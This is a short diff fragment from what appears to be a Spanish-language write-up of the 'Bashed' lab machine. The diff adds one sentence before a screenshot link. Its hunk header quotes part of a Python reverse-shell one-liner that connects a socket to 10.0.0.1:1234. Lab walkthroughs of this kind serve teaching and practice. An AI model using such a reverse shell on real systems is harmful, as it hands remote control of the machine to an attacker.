@@ -157,4 +157,6 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));
 
 ```
 
+Debe quedar de la siguiente forma:
+
 ![script.jpg]({{site.baseurl}}/images/Bashed/script.jpg)
